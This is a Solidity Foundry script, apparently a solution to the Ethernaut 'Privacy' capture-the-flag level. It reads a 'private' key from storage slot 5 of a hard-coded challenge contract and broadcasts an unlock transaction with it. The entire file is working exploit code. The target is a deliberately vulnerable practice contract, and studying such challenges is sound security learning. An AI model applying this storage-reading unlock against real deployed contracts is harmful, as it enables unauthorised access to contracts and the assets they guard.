// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "src/12Privacy.sol";

contract PrivacyAttack is Script {
    address constant CHALLENGE = 0x4c03834831987B5c8173aE0E604F6d837e3e0378;
    Privacy public privacy;

    function run() public {
        bytes32 value = vm.load(CHALLENGE, bytes32(uint256(5)));
        console.log("key:", uint256(value));
        vm.startBroadcast(); // Starts broadcasting transactions
        privacy = Privacy(CHALLENGE);
        privacy.unlock(bytes16(value));
        console.log(privacy.locked());
        vm.stopBroadcast();
    }
}
